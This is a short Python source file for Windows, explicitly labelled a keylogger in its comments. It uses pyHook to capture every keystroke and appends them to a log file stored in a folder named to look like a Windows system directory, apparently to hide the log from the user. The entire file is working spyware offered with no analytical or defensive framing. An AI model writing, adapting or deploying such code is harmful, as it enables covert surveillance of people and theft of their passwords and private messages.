import sys
import pythoncom, pyHook

def OnKeyboardEvent(event):
	strokes={27:'<Esc>',8:"<Backspace>",9:"<Tab>",13:"<Return>"}
	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
	if event.Ascii == 5:        # Press Ctrl+E to terminate the keylogger.
		sys.exit()
	if event.Ascii != 0:
		f = open (directory_name+'\\log.ob', 'a')    #Output file is placed here.
		if strokes.has_key(event.Ascii):
			keylogs=strokes[event.Ascii]
		else:
			keylogs = chr(event.Ascii)
	if event.Ascii == 13:
		keylogs = keylogs + '\n'
	#print event.Ascii
	try:
		f.write(keylogs)
		f.close()
	except:
		pass

def logger():
	while True:
			hm = pyHook.HookManager()
			hm.KeyDown = OnKeyboardEvent
			hm.HookKeyboard()
			pythoncom.PumpMessages()